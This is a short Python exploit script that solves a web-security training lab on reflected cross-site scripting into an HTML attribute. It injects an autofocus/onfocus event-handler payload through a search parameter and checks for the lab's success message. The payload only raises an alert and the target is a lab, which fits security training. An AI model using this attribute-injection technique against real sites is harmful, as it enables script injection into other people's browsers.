import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def xss_attack(url):
    # PAYLOAD
    payload_url = url + '/?search=" autofocus onfocus=alert(document.domain) x="'

    # SEND PAYLOAD
    r = requests.get(payload_url, verify=False, proxies=proxies)

    # CHECK IF EXPLOIT WAS SUCCESSFUL
    r = requests.get(url, verify=False, proxies=proxies)

    if "Congratulations, you solved the lab!" not in r.text:
        print("[-] Exploit failed")
        sys.exit(-1)
    print("[+] Exploit succeeded!")

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Lab: Reflected XSS into attribute with angle brackets HTML-encoded")
    print("""[+] This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded.  
    To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.""")

    xss_attack(url)

if __name__ == "__main__":
    main()